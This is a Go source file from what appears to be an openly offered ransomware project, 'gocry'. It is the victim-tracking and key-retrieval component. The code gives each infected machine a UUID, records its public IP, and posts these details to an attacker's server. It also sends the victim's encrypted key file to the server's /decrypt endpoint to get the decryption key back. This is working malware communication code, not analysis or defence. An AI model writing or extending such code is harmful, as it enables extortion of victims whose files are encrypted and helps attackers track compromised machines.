package victim

import (
	"bytes"
	"encoding/json"
	"errors"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/nireo/gocry/config"
	uuid "github.com/satori/go.uuid"
)

// VictimIndentifer helps the server identify the victim's computer.
type VictimIndentifier struct {
	UUID      string `json:"uuid"` // a unique id used to identify the victim
	IP        string `json:"ip"`
	Timestamp int64  `json:"timestamp"`
}

// NewVictimIndentifer returns a pointer to a victim indentifer with a generated UUID and a timestamp.
func NewVictimIndentifer() *VictimIndentifier {
	uuid := uuid.NewV4()

	return &VictimIndentifier{
		UUID:      uuid.String(),
		Timestamp: time.Now().Unix(),
	}
}

// SendToServer sends the victim indentifier data to the server to be stored in
// a database. Takes in a custom path such that setting up the ransomware is easier for users.
func (vi *VictimIndentifier) SendToServer(url string) error {
	jsonBody, err := json.Marshal(vi)
	if err != nil {
		return errors.New("error unmarshaling json data: " + err.Error())
	}

	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonBody))
	if err != nil {
		return errors.New("error sending victim data to server: " + err.Error())
	}

	if resp.StatusCode != http.StatusOK {
		return errors.New("the status of the rqeuest wasn't successfull")
	}

	return nil
}

// GetPublicIP fills the IP field of the victim indentifier with the public api of
// the victim's machine.
func (vi *VictimIndentifier) GetPublicIP() error {
	res, err := http.Get("https://api.ipify.org?format=text")
	if err != nil {
		return err
	}
	defer res.Body.Close()

	ip, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return err
	}

	vi.IP = string(ip)

	return nil
}

// GetKeyFromServer sends the key.txt data to the server and then the server
// decrypts the data using the rsa private key.
func (vi *VictimIndentifier) GetKeyFromServer(keyFileData []byte) ([]byte, error) {
	req, err := http.NewRequest("POST", config.GetConfig().ServerPath+
		"/decrypt?id="+vi.UUID, bytes.NewBuffer(keyFileData))
	if err != nil {
		return nil, err
	}

	cl := http.Client{}
	res, err := cl.Do(req)
	if err != nil {
		return nil, err
	}
	defer res.Body.Close()

	deckey, err := ioutil.ReadAll(res.Body)
	if err != nil {
		return nil, err
	}

	return deckey, nil
}
